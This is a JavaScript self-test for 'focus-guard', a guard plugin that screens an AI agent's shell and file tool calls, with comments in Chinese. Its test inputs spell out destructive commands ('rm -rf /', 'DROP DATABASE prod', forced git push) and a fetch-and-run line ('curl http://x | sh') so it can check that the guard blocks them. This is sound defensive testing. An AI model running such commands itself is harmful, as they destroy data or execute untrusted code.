/**
 * focus-guard 原生插件阶段一自检（零 API 成本，node tools/selftest.mjs）
 *
 * 三档验证（对应实施指令测试 A/B/C）：
 *   A 拦截：bash rm -rf 族 → {kind:"deny"} 且理由含 focus-guard
 *   B 放行：其余命令/非命令工具 → next() 透传（fallback {kind:"allow"}）
 *   C fail-open：监听体内抛异常 → 放行 + 告警；模块级语法错误 → import 抛错可被隔离
 *
 * 瀑布语义按装机源码实现：dsh-tools:3225（单 fallback allow）+
 * 桥接线（监听器返回决策即短路，返回 next() 即委托下游）。
 * 另附装机 cordis 可导入性冒烟（真实缝消费由 dsh-tools:3225 源码锚定，挂载后实弹）。
 *
 * 硬纪律：**自检永远只写 tmpdir()，绝不碰真实工作区**（FG_CASE_FILE 重定向 + 真实卷宗未触碰断言）。
 */
import { writeFileSync, mkdtempSync, rmSync, readFileSync, existsSync, statSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, dirname } from 'node:path'
import { fileURLToPath, pathToFileURL } from 'node:url'

// —— 卷宗隔离：自检**永远只写临时目录**，绝不碰真实工作区 ——
// 2026-10-07 事故：自检曾在真实 .ai/CASE_FILE.md 上落账/覆盖。此后本文件所有写路径必须经
// FG_CASE_FILE 重定向到 tmpdir()，并断言真实卷宗未被触碰。
const TEST_CASE_FILE = join(tmpdir(), `fg-selftest-${Date.now()}-CASE_FILE.md`)
process.env.FG_CASE_FILE = TEST_CASE_FILE

// —— 审计 / 心跳隔离（2026-10-18 补漏）——
// 本文件第 61 行会真的调 apply()，而 apply() 从 2026-10-18 起会**无条件写一条启动自证**
// （compaction-watch-ready）。此前这里只重定向了卷宗、没重定向审计，于是每跑一次自检就往
// 真实 .focus-guard/AUDIT.log 追加一条带自检 pid 的"监察层就位"—— 实测一次排查里刷了 10 条，
// 与生产记录混在一起，正好毁掉那条自证的可信度。心跳同理：自检退出后 status.json 会残留
// 一个已死 pid（真实进程 10s 内会覆写，但不该依赖它自愈）。
const TEST_AUDIT_FILE = join(tmpdir(), `fg-selftest-${Date.now()}-AUDIT.log`)
const TEST_STATUS_FILE = join(tmpdir(), `fg-selftest-${Date.now()}-status.json`)
process.env.FG_AUDIT_FILE = TEST_AUDIT_FILE
process.env.FG_STATUS_FILE = TEST_STATUS_FILE
// 2026-10-29：审批目录同样要隔离。上面那条"只重定向卷宗、没重定向审计"的教训已经演过一次，
// 这次是第三个面——`rm -rf` 类用例会触发 createApprovalRequest 写真实 approvals/。
process.env.FG_APPROVAL_DIR = join(tmpdir(), `fg-selftest-${Date.now()}-approvals`)

// 隔离的兜底断言：跑完比对真实审计文件大小，涨了就是漏了。
// 2026-10-18：本文件从 src/dsh/ 移到 tools/（自检是工具不是宿主缝），相对深度少一级。
const REAL_AUDIT = fileURLToPath(new URL('../../../.focus-guard/AUDIT.log', import.meta.url))
const realAuditSizeBefore = existsSync(REAL_AUDIT) ? statSync(REAL_AUDIT).size : -1

// —— 会话状态隔离（2026-10-18）——
// 病根：自检的 fake exec 没有 `agent.session.header.id`，`sessionIdOf()`（pipeline.mjs:296）退化为
// 'dsh-native'，状态文件固定落在 %TEMP%/focus-guard-dsh-native.json，**跨运行累积**。
// 而自检自己的 post-execute 熔断用例会把 `fused` 置真并落盘 —— 于是下一次运行时，
// 测试 A2（pwsh Remove-Item）与测试 B（write 内容含 rm -rf）在跑到之前就已经处于熔断态，
// 被**第3层状态校验**（pipeline.mjs:342-345）拒掉，表现为"第1层漏网"的假象。
// 实测：清空该文件后连跑两次全绿；不清则第 2 次起必红（fused=true, violations=3, stalledStreak=3）。
// 修法：每次运行一个唯一 sid → 状态文件互不相干；退出时清理。
const SELFTEST_SID = `selftest-${process.pid}-${Date.now().toString(36)}`
/**
 * 把 fake exec 挂上自检专属会话身份（形状与真实 exec 一致：agent.session.header.id）。
 * ⚠ 绝不能用展开运算符 `{...call}` —— 测试 C 里有个 `arguments` getter 会抛错的 evil exec，
 * 展开会**读取所有自有属性**从而提前把那个 getter 触发掉，等于替被测代码挨了子弹。
 * 用 Object.create 走原型委托 + defineProperty 只加一个自有属性，全程零属性读取。
 */
const withSelftestSession = (call) => {
  const wrapped = Object.create(call)
  // ⚠ 只读 call.agent（普通对象），绝不碰 call 自身的 getter；且必须**保留**原有 agent 字段
  // ——测试 B3 的台账用例靠 agent.model 决定价目，整块替换会把 deepseek-flash 弄丢。
  let agent = {}
  try {
    if (call.agent && typeof call.agent === 'object') agent = { ...call.agent }
  } catch {
    agent = {}
  }
  agent.session = { header: { id: SELFTEST_SID, cwd: process.cwd() } }
  Object.defineProperty(wrapped, 'agent', { value: agent, enumerable: true, configurable: true, writable: true })
  return wrapped
}
/** 判断瀑布首参是不是 exec（命令类/文件类工具调用的形状），别把 assembly 之类的对象误判。 */
const looksLikeExec = (a) => {
  try {
    // 用 `in` 判存在，不读值：evil exec 的 arguments 是抛错 getter。
    return !!a && typeof a === 'object' && typeof a.name === 'string' && 'arguments' in a
  } catch {
    return false
  }
}

const here = dirname(fileURLToPath(import.meta.url))
// 2026-10-18：本文件已移到 tools/，模块入口统一走 ../src/dsh/ 与 ../src/core/。
const SRC_DSH = join(here, '..', 'src', 'dsh')
const SRC_CORE = join(here, '..', 'src', 'core')
const { name, apply } = await import(pathToFileURL(join(SRC_DSH, 'index.js')))
const { redlineOf } = await import(pathToFileURL(join(SRC_DSH, 'pipeline.mjs')))
const { statePath: guardStatePath, loadState: guardLoadState } = await import(
  pathToFileURL(join(SRC_CORE, 'state.mjs'))
)

// —— 迷你瀑布：忠实实现 cordis 语义（cordis/lib/index.js:317-325）——
// 末位参数为 fallback；每个监听器收到的实参 = 官方实参 + 末位 next。
function makeWaterfall(listeners, fallback) {
  return async (...args) => {
    const dispatch = (i) => async () => {
      if (i >= listeners.length) return fallback(...args)
      const next = await dispatch(i + 1)
      return listeners[i](...args, next)
    }
    return dispatch(0)()
  }
}

const warns = []
const origWarn = console.warn
console.warn = (...parts) => warns.push(parts.map(String).join(' '))

const events = []
const listenersByEvent = new Map()
/** 按事件名取该缝的监听器（一条缝一个迷你瀑布，避免跨缝串扰） */
function listenersFor(event) {
  return listenersByEvent.get(event) ?? []
}
const ctx = {
  logger: { warn: (...p) => events.push(['logger.warn', ...p]) },
  on(event, listener) {
    events.push(['on', event])
    if (!listenersByEvent.has(event)) listenersByEvent.set(event, [])
    listenersByEvent.get(event).push(listener)
    return () => {}
  },
}
apply(ctx)

let pass = 0
let fail = 0
function check(label, cond, extra) {
  if (cond) {
    pass++
    origWarn(`  ✓ ${label}`)
  } else {
    fail++
    origWarn(`  ✗ ${label}${extra ? ' —— ' + extra : ''}`)
  }
}

const fallbackAllow = () => Promise.resolve({ kind: 'allow' })
/** 按缝构造迷你瀑布：只跑该缝的监听器，fallback 形状与该缝官方默认一致 */
const makeRun = (event, fallback) => {
  const waterfall = makeWaterfall(listenersFor(event), (...a) => Promise.resolve(fallback(...a)))
  // 首参是 exec 的一律挂上自检专属会话身份（见上方"会话状态隔离"）。
  return (...args) => {
    const [first, ...rest] = args
    return waterfall(...(looksLikeExec(first) ? [withSelftestSession(first), ...rest] : args))
  }
}
const run = makeRun('tools/pre-execute', () => ({ kind: 'allow' }))

console.warn('== 注册自检 ==')
check('apply 导出 name', name === 'focus-guard', `实际 ${name}`)
check('注册了 tools/pre-execute 监听', events.some(([t, e]) => t === 'on' && e === 'tools/pre-execute'))

// 起点状态断言（2026-10-18）：把"状态串扰"从"规则漏网"里分离出来。
// 有了它，未来若再出现同类污染，红的是这一条（指名道姓），而不是 A2/B 那两条边界用例。
{
  const startState = guardLoadState(guardStatePath(SELFTEST_SID))
  check(
    '自检起点状态干净（未熔断 / 零违规）',
    startState.fused !== true && !startState.probation,
    `fused=${startState.fused} probation=${startState.probation}`,
  )
}

console.warn('== 测试 A：第1层绝对红线（短路 deny，不进第2层）==')
{
  const gate = await run({ name: 'bash', arguments: { command: 'rm -rf /' } })
  check('rm -rf / 短路 deny', gate.kind === 'deny', JSON.stringify(gate))
  check('deny 理由含红线名', typeof gate.reason === 'string' && gate.reason.includes('rm-rf-root'))
}
{
  const gate = await run({ name: 'bash', arguments: { command: 'rm -rf ~/' } })
  check('rm -rf ~/ 命中红线 deny', gate.kind === 'deny')
}
{
  const gate = await run({ name: 'bash', arguments: { command: 'git push -f origin main' } })
  check('git push -f 命中红线 deny', gate.kind === 'deny')
}
{
  const gate = await run({ name: 'bash', arguments: { command: 'DROP DATABASE prod' } })
  check('DROP DATABASE 命中红线 deny', gate.kind === 'deny')
}
{
  const gate = await run({ name: 'bash', arguments: { command: 'TRUNCATE TABLE orders' } })
  check('TRUNCATE TABLE 命中红线 deny', gate.kind === 'deny')
}
{
  // 2026-10-09 更新：本用例只验"红线层不误伤"，但管线在红线之后还有**资格闸**（3.0.5 加入）——
  // 它对任意递归强删都要求先 fg_apply，射程比红线宽（红线只认根/HOME）。故断言改为
  // "未命中绝对红线、但被资格闸拦"，否则等于在测"资格闸不存在"。
  // 2026-10-18 射程扩大：`/usr` 已并入绝对红线（见 A4「射程内：rm --recursive --force /usr」），
  // 故本用例的"非根路径"样本从 `"/usr"` 换成 `"./build"` —— 仍带引号、仍非根，A1 的原意图不变。
  // 2026-10-18 任务测试 T35 后：`build` 已被归入"可重建目录"，不再进资格闸门槛（交第 2 层分级），
  // 样本再换成 `./app-src` —— 仍是"带引号的非根路径"，仍应被资格闸拦。
  const gate = await run({ name: 'bash', arguments: { command: 'rm -rf "./app-src"' } })
  check(
    '带引号的非根路径不命中红线（改由资格闸拦）',
    (gate.kind === 'deny' || gate.kind === 'ask') && !/绝对红线/.test(String(gate.reason || '')),
    JSON.stringify(gate),
  )
}

console.warn('== 测试 A2：第1层两档分流（普通 rm -rf 不进红线，由资格闸接管）==')
{
  // 同 A1：不命中红线 ≠ 放行 —— 资格闸会接管（要求先 fg_apply）。
  const gate = await run({ name: 'bash', arguments: { command: 'rm -rf ./test-dir' } })
  check(
    'rm -rf ./test-dir 不在红线（改由资格闸拦）',
    (gate.kind === 'deny' || gate.kind === 'ask') && !/绝对红线/.test(String(gate.reason || '')),
    JSON.stringify(gate),
  )
}
{
  const gate = await run({ name: 'bash', arguments: { command: 'cd /tmp && rm -fr app-src/' } })
  check(
    'rm -fr app-src/ 不在红线（改由资格闸拦）',
    (gate.kind === 'deny' || gate.kind === 'ask') && !/绝对红线/.test(String(gate.reason || '')),
  )
}
{
  // 2026-10-18 新增（任务测试 T35/T36 确立的分级口径）：可重建目录/TEMP 不再要事前申请。
  const disposable = await run({ name: 'bash', arguments: { command: 'rm -rf ./dist' } })
  check(
    'rm -rf ./dist 属可重建目录 → 放行（交第 2 层分级，不再一刀切要 fg_apply）',
    disposable.kind === 'allow',
    JSON.stringify(disposable),
  )
}
{
  const gate = await run({ name: 'pwsh', arguments: { command: 'Remove-Item -Recurse -Force ./x' } })
  check('非 rm 命令不受第1层管辖（交下游特征库）', gate.kind === 'allow')
}

console.warn('== 测试 A4：第1层射程边界（直击 redlineOf，不经状态层）==')
// 2026-10-18 新增。动机：上面 A2 / B 两条是**端到端**断言，一旦上游状态被污染（熔断/降权）
// 就会红，而红的位置看起来像"第1层漏网"，实际与第1层无关。这里把射程本身钉死：
//   ① 正向：rm 族递归强删根/HOME 必拦（射程不得收窄）
//   ② 反向：非 rm 族、非根路径、非命令字段一律不认（射程不得放宽）
// 这两侧同时锁定，A2/B 的语义才是可解释的。
{
  const nameOf = (cmd) => redlineOf(cmd)?.name ?? null

  // ① 正向：射程内必须拦
  check('射程内：rm -rf / → rm-rf-root', nameOf('rm -rf /') === 'rm-rf-root')
  check('射程内：rm -fr ~/ → rm-rf-root', nameOf('rm -fr ~/') === 'rm-rf-root')
  check('射程内：rm --recursive --force /usr → rm-rf-root', nameOf('rm --recursive --force /usr') === 'rm-rf-root')
  check('射程内：git push -f → git-push-force', nameOf('git push -f origin main') === 'git-push-force')
  check('射程内：DROP DATABASE → drop-database', nameOf('DROP DATABASE prod') === 'drop-database')

  // ② 反向：射程外不得误伤
  check(
    '射程外：Remove-Item 不是 rm 族',
    nameOf('Remove-Item -Recurse -Force ./x') === null,
    `实际 ${nameOf('Remove-Item -Recurse -Force ./x')}`,
  )
  check('射程外：rm -rf ./build（相对路径，非根/HOME）', nameOf('rm -rf ./build') === null)
  check('射程外：rm -rf build（同上）', nameOf('rm -rf build') === null)
  check('射程外：rm file.txt（无递归）', nameOf('rm file.txt') === null)
  check('射程外：write 无 command 字段 → 第1层根本看不到内容', redlineOf(undefined) === null)
  check(
    '射程外：内容里的 rm -rf 字样不构成命令（第1层只吃 command）',
    // 第1层拿到的是 command 字符串；write 的 content 永远走不到这里（commandOf 返回 null）。
    // 这里锁定"把内容当命令喂进去会命中、但流水线不会这么喂"这一事实，防止有人改成扫 content。
    nameOf('文档里提到 rm -rf 很危险') === null,
  )
}

console.warn('== 测试 A3：第2层语义预判阈值（注入 riskOf 驱动）==')
{
  const { preExecuteListener, riskOfHeuristic } = await import(pathToFileURL(join(SRC_DSH, 'pipeline.mjs')))
  const mk = (riskOf, effective = false) => preExecuteListener({ warn: () => {}, riskOf, observe: { effective, judgements: 0, highRisk: 0 } })
  const passthrough = async () => ({ kind: 'allow' })

  const askGate = await mk(async () => ({ risk: 0.9, category: 'filesystem_destruction' }), true)(
    { name: 'bash', arguments: { command: 'node cleanup.mjs --all' } },
    passthrough,
  )
  check('risk=0.9 → 返回 ask 决策', askGate.kind === 'ask', JSON.stringify(askGate))
  check('ask 带 reason + displayReason', typeof askGate.reason === 'string' && typeof askGate.displayReason === 'string')

  const lowGate = await mk(async () => ({ risk: 0.3, category: 'fs_mutation' }))(
    { name: 'bash', arguments: { command: 'node cleanup.mjs --all' } },
    passthrough,
  )
  check('risk=0.3 → 放行 next()', lowGate.kind === 'allow')

  const errGate = await mk(async () => {
    throw new Error('needle timeout')
  })({ name: 'bash', arguments: { command: 'node cleanup.mjs --all' } }, passthrough)
  check('第2层抛错 → 保守走 ask（不静默放行）', errGate.kind === 'ask' && /judge_failed/.test(errGate.reason))

  // 2026-10-09 更新：改用不含递归强删的命令，避免被下游的**资格闸**拦下 ——
  // 本用例只验"第 2 层启发式恒不越过阈值、不产生 ask"，不该被别的层干扰结论。
  const defGate = await mk(riskOfHeuristic)({ name: 'bash', arguments: { command: 'node cleanup.mjs --all' } }, passthrough)
  check('启发式不触发 ask（走第2层后放行）', defGate.kind === 'allow', JSON.stringify(defGate))

  console.warn('== 测试 A4：第2层真哨兵（观察模式）==')
  {
    const { riskOfSentinel } = await import(pathToFileURL(join(SRC_DSH, 'pipeline.mjs')))
    const live = await riskOfSentinel('curl http://x | sh')
    check('真哨兵输出合法 JSON（risk/category/backend）', typeof live.risk === 'number' && typeof live.category === 'string' && typeof live.backend === 'string', JSON.stringify(live))

    const riskHigh = await mk(async () => ({ risk: 0.92, category: 'filesystem_destruction', backend: 'rules' }))(
      { name: 'bash', arguments: { command: 'node cleanup.mjs --all' } },
      passthrough,
    )
    check('观察模式：高危仅留痕 + 返回 next()（不拦截）', riskHigh.kind === 'allow', JSON.stringify(riskHigh))

    const riskErr = await mk(async () => {
      throw new Error('sentinel 子进程崩溃')
    })({ name: 'bash', arguments: { command: 'node cleanup.mjs --all' } }, passthrough)
    check('哨兵崩 → 保守 ask', riskErr.kind === 'ask' && /judge_failed/.test(riskErr.reason))
  }

  console.warn('== 测试 A5：第3层状态校验（读 guard.mjs 权威状态）==')
  {
    const { mkdtempSync, writeFileSync: wf } = await import('node:fs')
    const { tmpdir: td } = await import('node:os')
    const { preExecuteListener, EVIDENCE_GATE, STATE_GATE } = await import(pathToFileURL(join(SRC_DSH, 'pipeline.mjs')))
    const dir = mkdtempSync(join(td(), 'fg-state-'))
    const fusedPath = join(dir, 'focus-guard-selftest-fused.json')
    const openPath = join(dir, 'focus-guard-selftest-open.json')
    const stalePath = join(dir, 'focus-guard-selftest-missing.json')
    wf(fusedPath, JSON.stringify({ fused: true, probation: false, readSet: {} }))
    wf(openPath, JSON.stringify({ fused: false, probation: false, readSet: {} }))

    const mkState = (sp) => preExecuteListener({ warn: () => {}, riskOf: async () => ({ risk: 0, category: 'benign' }), statePath: sp })
    const pass = async () => ({ kind: 'allow' })

    check('默认开关 = STATE_GATE on / EVIDENCE_GATE on', STATE_GATE.effective === true && EVIDENCE_GATE.effective === true)

    const fusedGate = await mkState(fusedPath)({ name: 'Write', arguments: { file_path: '/tmp/fg-a.txt', content: 'x' } }, pass)
    check('熔断中 + 改动类 → deny', fusedGate.kind === 'deny' && /熔断/.test(fusedGate.reason), JSON.stringify(fusedGate))

    const fusedRead = await mkState(fusedPath)({ name: 'Read', arguments: { file_path: '/tmp/fg-a.txt' } }, pass)
    check('熔断中 + 只读 → 放行', fusedRead.kind === 'allow')

    // 2026-10-09 更新：目标必须是**真实存在**的文件。原用 `/tmp/fg-never-read.txt`，
    // 它不存在 → 走"新建文件放行"分支（3.0.7 缺陷 C 的修复），根本测不到"未取证"。
    const existingTarget = join(dir, 'exists-but-unread.txt')
    wf(existingTarget, 'x')
    const unseenGate = await mkState(openPath)({ name: 'Write', arguments: { file_path: existingTarget, content: 'x' } }, pass)
    check('未取证 + 改已存在文件 → deny', unseenGate.kind === 'deny' && /取证/.test(unseenGate.reason), JSON.stringify(unseenGate))

    const noStateGate = await mkState(stalePath)({ name: 'Write', arguments: { file_path: '/tmp/fg-b.txt', content: 'x' } }, pass)
    check('读不到状态 → fail-open 放行（不静默：有 warn）', noStateGate.kind === 'allow')
  }
}

console.warn('== 测试 B：放行 ==')
{
  // 2026-10-09 更新：`ls` 会被本项目自己的**环境指纹硬校验**拦（本机 map ls→eza），
  // 那是"本机命令替代表"的预期行为、不是误伤。改用无替代映射的日常命令来验"零打扰"。
  const gate = await run({ name: 'bash', arguments: { command: 'node build.js' } })
  check('日常命令零打扰放行', gate.kind === 'allow', JSON.stringify(gate))
}
{
  // 先 Read 同一路径（第 3 层取证语义：先读后写），本块只验第1层不被内容里的危险字样误伤
  const readGate = await run({ name: 'read', arguments: { path: 'a.md' } })
  check('先读 a.md（第3层取证前提）', readGate.kind === 'allow')
  const gate = await run({ name: 'write', arguments: { path: 'a.md', content: '文档里提到 rm -rf 很危险' } })
  check('写文件内容提及 rm -rf 不误伤', gate.kind === 'allow')
}
{
  const gate = await run({ name: 'read', arguments: { path: 'b.txt' } })
  check('无命令参数的工具放行', gate.kind === 'allow')
}

console.warn('== 测试 B2：system-prompt/assemble（真实三参 assembly,context,next）==')
{
  const fallbackAssembly = { sections: [{ name: 'base', text: 'BASE' }], tools: [], variables: {} }
  const runAssemble = makeRun('system-prompt/assemble', () => fallbackAssembly)
  const assembled = await runAssemble(fallbackAssembly, { agent: 'selftest' })
  check(
    '成本提示行以新增 section 注入',
    Array.isArray(assembled?.sections) &&
      assembled.sections.some((s) => typeof s?.text === 'string' && s.text.includes('【成本】')),
    JSON.stringify(assembled)?.slice(0, 160),
  )
  check('原 assembly 对象未被就地改写', fallbackAssembly.sections[0].text === 'BASE')
}

console.warn('== 测试 B3：tools/post-execute（真实三参 exec,result,next）==')
{
  // 契约修复点：监听器必须把下游决策原样返回（此前是 next() 缺失时返回 undefined）
  const runPost = makeRun('tools/post-execute', () => ({ kind: 'accept', marker: 'downstream' }))
  const decision = await runPost({ name: 'read', arguments: { path: 'x' } }, { content: 'ok' })
  check('post-execute 原样透传下游决策（accept）', decision?.marker === 'downstream', JSON.stringify(decision))
}
{
  // 台账写入走真实代码路径，但目标已被 FG_CASE_FILE 重定向到 tmpdir()
  // 2026-10-18：移到 tools/ 后深度少一级（tools → packages/core → packages → 仓库根）。
  const realCaseFile = join(here, '..', '..', '..', '.ai', 'CASE_FILE.md')
  const before = existsSync(realCaseFile) ? readFileSync(realCaseFile, 'utf8') : ''
  const runUsage = makeRun('tools/post-execute', () => ({ kind: 'accept' }))
  await runUsage(
    { name: 'read', arguments: { path: 'x' }, agent: { model: 'deepseek-flash' } },
    { content: 'ok', usage: { input: 1000, cacheRead: 500, output: 2000 } },
  )
  const tmpText = existsSync(TEST_CASE_FILE) ? readFileSync(TEST_CASE_FILE, 'utf8') : ''
  check(
    '台账写入重定向到 tmp（真实卷宗零写入）',
    tmpText.includes('deepseek-flash'),
    `tmp=${TEST_CASE_FILE} len=${tmpText.length}`,
  )
  const after = existsSync(realCaseFile) ? readFileSync(realCaseFile, 'utf8') : ''
  check('真实 .ai/CASE_FILE.md 未被触碰', before === after, before === after ? '' : '内容发生变化')
}

// 审计隔离兜底（2026-10-18）：apply() 会写启动自证，这里必须证明它写进了 tmp 而不是真台账。
{
  const afterSize = existsSync(REAL_AUDIT) ? statSync(REAL_AUDIT).size : -1
  check(
    '真实 .focus-guard/AUDIT.log 未被触碰',
    afterSize === realAuditSizeBefore,
    `before=${realAuditSizeBefore} after=${afterSize}`,
  )
  const own = existsSync(TEST_AUDIT_FILE) ? readFileSync(TEST_AUDIT_FILE, 'utf8') : ''
  check(
    '启动自证写进了沙箱（compaction-watch-ready）',
    own.includes('"action":"compaction-watch-ready"'),
    own ? `沙箱行数=${own.trim().split('\n').filter(Boolean).length}` : '沙箱为空 —— apply() 未留痕',
  )
}

console.warn('== 测试 C：fail-open ==')
{
  // 构造 arguments 访问即炸的 exec，验证监听体内异常不阻塞
  const evilExec = { name: 'bash', get arguments() { throw new Error('payload 解析炸了') } }
  const gate = await run(evilExec)
  check('监听体内异常不阻塞，降级放行', gate.kind === 'allow')
  check('异常有 console.warn 留痕', warns.some((w) => w.includes('fail-open')))
}
{
  // 模块级语法错误：import 阶段即抛 SyntaxError——加载层可捕获
  // （DSH 加载器实证：cordis-plugin-loader/lib/index.js:88-90 create(...).catch(logger.error) 只记日志不崩宿主）
  const bad = join(mkdtempSync(join(tmpdir(), 'fg-native-')), 'broken.mjs')
  writeFileSync(bad, 'export const name = ("focus-guard"\n')
  let isolated = false
  try {
    await import(pathToFileURL(bad))
  } catch (error) {
    isolated = error instanceof SyntaxError
  } finally {
    rmSync(dirname(bad), { recursive: true, force: true })
  }
  check('语法错误模块在 import 层抛错、可被加载方捕获', isolated)
}

console.warn('== 装机 cordis 冒烟（可选） ==')
{
  const CORDIS = 'E:/DSH/DSH Desktop/resources/app/node_modules/@deepseek-ai/cordis/lib/index.js'
  try {
    await import(pathToFileURL(CORDIS))
    origWarn('  ✓ 装机 @deepseek-ai/cordis 可导入（真实 Context 编排留待挂载后实弹）')
  } catch (error) {
    origWarn(`  - 跳过（${(error && error.message) || error}）——本地瀑布自检已覆盖逻辑层`)
  }
}

// —— 收尾清理（2026-10-18）——
// 自检用唯一 sid 生成的状态文件、审计沙箱、心跳沙箱全部删掉，不给 %TEMP% 留残留。
// 特别是状态文件：留着就是下一次运行的地雷（熔断态会被继承，见上方"会话状态隔离"）。
{
  const leftovers = [guardStatePath(SELFTEST_SID), TEST_AUDIT_FILE, TEST_STATUS_FILE]
  let cleaned = 0
  for (const f of leftovers) {
    try {
      rmSync(f, { force: true })
      cleaned += 1
    } catch {
      /* 删不掉不致命：唯一 sid 保证下次不会读到它 */
    }
  }
  origWarn(`  · 沙箱清理：${cleaned}/${leftovers.length} 个临时文件已删除（sid=${SELFTEST_SID}）`)
}

console.warn(`\n自检结果：${pass} 通过 / ${fail} 失败`)
console.warn = origWarn
process.exit(fail === 0 ? 0 : 1)
